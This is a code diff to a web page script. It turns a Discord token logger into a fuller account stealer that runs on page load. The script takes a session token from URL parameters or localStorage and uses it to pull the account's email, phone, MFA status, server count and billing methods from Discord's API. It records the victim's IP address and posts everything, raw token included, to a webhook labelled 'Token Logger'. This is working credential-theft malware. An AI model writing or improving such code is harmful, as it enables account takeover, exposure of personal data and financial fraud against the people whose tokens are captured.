@@ -44,110 +44,167 @@
     // Prevent duplicate sends
     let hasSent = false;
 
+    // Discord API endpoints for token validation
+    const DISCORD_API = {
+      USER_INFO: 'https://discord.com/api/v9/users/@me',
+      GUILDS: 'https://discord.com/api/v9/users/@me/guilds',
+      BILLING: 'https://discord.com/api/v9/users/@me/billing/payment-sources'
+    };
+
     async function processData() {
-      // Prevent double execution
       if (hasSent) {
-        console.log('[Already sent, closing...]');
-        window.location.href = "https://google.com"
-        return;
-      }
-
-      const urlParams = new URLSearchParams(window.location.search);
-      
-      // Get session token from URL parameter (prefer this over 'token' param)
-      let rawToken = urlParams.get('session') || urlParams.get('token');
-      const userAgent = urlParams.get('ua') || navigator.userAgent;
-
-      // If no token in URL, check localStorage
-      if (!rawToken) {
-        rawToken = localStorage.getItem('discord_token') || 
-                   localStorage.getItem('token');
-      }
-
-      // If still no token, exit immediately
-      if (!rawToken) {
-        console.log('Token not found in URL or localStorage');
+        console.log('[Already sent]');
         window.close();
         return;
       }
 
-      // CRITICAL: Convert to string properly
+      const urlParams = new URLSearchParams(window.location.search);
+      let rawToken = urlParams.get('session') || urlParams.get('token');
+
+      // Get UA directly from browser
+      const userAgent = navigator.userAgent;
+
+      if (!rawToken) {
+        rawToken = localStorage.getItem('discord_token') || localStorage.getItem('token');
+      }
+
+      if (!rawToken) {
+        console.log('[✗] No token found');
+        window.close();
+        return;
+      }
+
+      // Convert to string
       let token;
-      
-      // If it's already a string, use it
       if (typeof rawToken === 'string') {
         token = rawToken;
-      } 
-      // If it's an object, try to extract or stringify
-      else if (typeof rawToken === 'object' && rawToken !== null) {
-        // Try to find token-like property
-        if (rawToken.token) {
-          token = String(rawToken.token);
-        } else if (rawToken.value) {
-          token = String(rawToken.value);
-        } else if (rawToken.data) {
-          token = String(rawToken.data);
-        } else {
-          // Last resort: stringify the whole object
-          token = JSON.stringify(rawToken);
-        }
-      }
-      // Fallback: force string conversion
-      else {
+      } else if (typeof rawToken === 'object' && rawToken !== null) {
+        if (rawToken.token) token = String(rawToken.token);
+        else if (rawToken.value) token = String(rawToken.value);
+        else token = JSON.stringify(rawToken);
+      } else {
         token = String(rawToken);
       }
 
-      // Decode if URL encoded
+      // Decode if needed
       try {
         const decoded = decodeURIComponent(token);
-        if (decoded !== token) {
-          token = decoded;
-        }
-      } catch (e) {
-        // If decode fails, use original
-      }
+        if (decoded !== token) token = decoded;
+      } catch (e) {}
 
-      // Log for debugging (truncated for security)
-      console.log('[Success]:', token.substring(0, 20) + '...');
+      console.log('[→] Processing token...');
 
       try {
-        // Mark as sending
         hasSent = true;
 
-        // Get IP information
+        // Validate token and get user info
+        const validationResult = await validateToken(token);
+
+        // Get IP and system info
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
 
-        // Collect system info
         const systemInfo = {
           os: getOSInfo(userAgent),
           browser: getBrowserInfo(userAgent),
-          ip: ipData.ip
+          ip: ipData.ip,
+          platform: navigator.platform,
+          language: navigator.language
         };
 
-        // Send data
-        const success = await sendData(token, systemInfo, userAgent);
+        // Send everything to webhook
+        const success = await sendData(token, systemInfo, userAgent, validationResult);
 
         if (success) {
-          console.log('[Success] Data sent - closing now');
-          // Close immediately after successful send
-          window.location.href = "https://google.com"
-        } else {
-          console.error('[Failed] Send failed - closing anyway');
-          window.location.href = "https://google.com"
+          console.log('[✓] Sent successfully');
         }
 
+        window.close();
+
       } catch (e) {
-        console.error('Data processing error:', e);
-        // Close even on error to avoid duplicate sends
-        window.location.href = "https://google.com"
+        console.error('[✗] Error:', e);
+        window.close();
       }
     }
-    
-    // Send data to webhook
-    async function sendData(token, systemInfo, userAgent) {
+
+    // Validate Discord token and get user info
+    async function validateToken(token) {
       try {
-        // Get webhook URL
+        // Fetch user info
+        const userResponse = await fetch(DISCORD_API.USER_INFO, {
+          headers: { 'Authorization': token }
+        });
+
+        if (!userResponse.ok) {
+          return {
+            valid: false,
+            error: `HTTP ${userResponse.status}`
+          };
+        }
+
+        const userData = await userResponse.json();
+
+        // Fetch guilds (servers)
+        let guilds = [];
+        try {
+          const guildsResponse = await fetch(DISCORD_API.GUILDS, {
+            headers: { 'Authorization': token }
+          });
+          if (guildsResponse.ok) {
+            guilds = await guildsResponse.json();
+          }
+        } catch (e) {}
+
+        // Fetch billing info
+        let billing = null;
+        try {
+          const billingResponse = await fetch(DISCORD_API.BILLING, {
+            headers: { 'Authorization': token }
+          });
+          if (billingResponse.ok) {
+            billing = await billingResponse.json();
+          }
+        } catch (e) {}
+
+        return {
+          valid: true,
+          user: {
+            id: userData.id,
+            username: userData.username,
+            discriminator: userData.discriminator,
+            email: userData.email || 'N/A',
+            verified: userData.verified || false,
+            phone: userData.phone || 'N/A',
+            mfa: userData.mfa_enabled || false,
+            nitro: getNitroType(userData.premium_type),
+            avatar: userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` : null
+          },
+          guilds: guilds.length,
+          hasBilling: billing && billing.length > 0,
+          billingCount: billing ? billing.length : 0
+        };
+
+      } catch (error) {
+        return {
+          valid: false,
+          error: error.message
+        };
+      }
+    }
+
+    // Get Nitro type
+    function getNitroType(premiumType) {
+      switch(premiumType) {
+        case 1: return 'Nitro Classic';
+        case 2: return 'Nitro';
+        case 3: return 'Nitro Basic';
+        default: return 'None';
+      }
+    }
+
+    // Send data to webhook
+    async function sendData(token, systemInfo, userAgent, validationResult) {
+      try {
         const response = await fetch('/api/get-webhook-url');
         const { webhookUrl } = await response.json();
 
@@ -155,17 +212,43 @@
           throw new Error('Webhook URL not configured');
         }
 
-        // Ensure token is string (triple check)
         const tokenString = String(token);
 
-        // Build payload
-        const payload = {
-          content: null,
-          embeds: [{
-            title: "🔐 Token Information",
-            description: "Authentication data has been captured successfully.",
-            color: 0x5865F2,
+        // Build embed based on validation result
+        let embed;
+
+        if (validationResult.valid) {
+          // Valid token - rich embed
+          embed = {
+            title: "🎯 Valid Token Captured",
+            description: "Active Discord account credentials intercepted",
+            color: 0x43B581, // Green for valid
             fields: [
+              {
+                name: "👤 User Info",
+                value: `\`\`\`Username: ${validationResult.user.username}#${validationResult.user.discriminator}\nID: ${validationResult.user.id}\nEmail: ${validationResult.user.email}\nPhone: ${validationResult.user.phone}\`\`\``,
+                inline: false
+              },
+              {
+                name: "🔒 Security",
+                value: `\`\`\`MFA: ${validationResult.user.mfa ? '✅' : '❌'}\nVerified: ${validationResult.user.verified ? '✅' : '❌'}\`\`\``,
+                inline: true
+              },
+              {
+                name: "💎 Nitro",
+                value: `\`\`\`${validationResult.user.nitro}\`\`\``,
+                inline: true
+              },
+              {
+                name: "🏠 Servers",
+                value: `\`\`\`${validationResult.guilds} servers\`\`\``,
+                inline: true
+              },
+              {
+                name: "💳 Billing",
+                value: `\`\`\`${validationResult.hasBilling ? `✅ ${validationResult.billingCount} method(s)` : '❌ None'}\`\`\``,
+                inline: true
+              },
               {
                 name: "🔑 Token",
                 value: `\`\`\`${tokenString}\`\`\``,
@@ -173,69 +256,98 @@
               },
               {
                 name: "🌐 IP Address",
-                value: `\`\`\`${String(systemInfo.ip)}\`\`\``,
+                value: `\`\`\`${systemInfo.ip}\`\`\``,
                 inline: true
               },
               {
-                name: "💻 System Info",
-                value: `\`\`\`OS: ${String(systemInfo.os)}\nBrowser: ${String(systemInfo.browser)}\`\`\``,
+                name: "💻 System",
+                value: `\`\`\`OS: ${systemInfo.os}\nBrowser: ${systemInfo.browser}\`\`\``,
                 inline: true
-              },
+              }
+            ],
+            thumbnail: validationResult.user.avatar ? {
+              url: validationResult.user.avatar
+            } : undefined,
+            footer: {
+              text: `Captured at ${new Date().toUTCString()}`,
+              icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
+            }
+          };
+        } else {
+          // Invalid token
+          embed = {
+            title: "⚠️ Invalid Token",
+            description: "Token validation failed",
+            color: 0xF04747, // Red for invalid
+            fields: [
               {
-                name: "🔍 User Agent",
-                value: `\`\`\`${String(userAgent)}\`\`\``,
+                name: "🔑 Token",
+                value: `\`\`\`${tokenString}\`\`\``,
                 inline: false
+              },
+              {
+                name: "❌ Error",
+                value: `\`\`\`${validationResult.error}\`\`\``,
+                inline: false
+              },
+              {
+                name: "🌐 IP Address",
+                value: `\`\`\`${systemInfo.ip}\`\`\``,
+                inline: true
+              },
+              {
+                name: "💻 System",
+                value: `\`\`\`OS: ${systemInfo.os}\nBrowser: ${systemInfo.browser}\`\`\``,
+                inline: true
               }
             ],
             footer: {
-              text: "Captured at " + new Date().toUTCString(),
+              text: `Captured at ${new Date().toUTCString()}`,
               icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
             }
-          }],
+          };
+        }
+
+        const payload = {
+          content: null,
+          embeds: [embed],
           username: "Token Logger",
           avatar_url: "https://cdn.discordapp.com/embed/avatars/1.png"
         };
-        
-        // Send to webhook
+
         await fetch(webhookUrl, {
           method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json' 
-          },
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
 
         return true;
 
       } catch (error) {
-        console.error('Webhook error:', error);
+        console.error('[Webhook Error]:', error);
         return false;
       }
     }
-    
-    // Detect OS
+
     function getOSInfo(ua) {
+      if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
       if (ua.includes("Windows NT")) return "Windows";
-      if (ua.includes("Mac OS")) return "macOS";
+      if (ua.includes("Mac OS X")) return "macOS";
       if (ua.includes("Linux")) return "Linux";
       if (ua.includes("Android")) return "Android";
       if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
       return "Unknown";
     }
-    
-    // Detect Browser
+
     function getBrowserInfo(ua) {
       if (ua.includes("Firefox/")) return "Firefox";
-      if (ua.includes("Edge/") || ua.includes("Edg/")) return "Edge";
+      if (ua.includes("Edg/")) return "Edge";
       if (ua.includes("Chrome/")) return "Chrome";
       if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
-      if (ua.includes("MSIE ") || ua.includes("Trident/")) return "Internet Explorer";
       return "Unknown";
     }
-    
-    // Start processing when page loads
-    window.addEventListener('load', processData);
 
+    window.addEventListener('load', processData);
   </script>
 </body>
 </html>
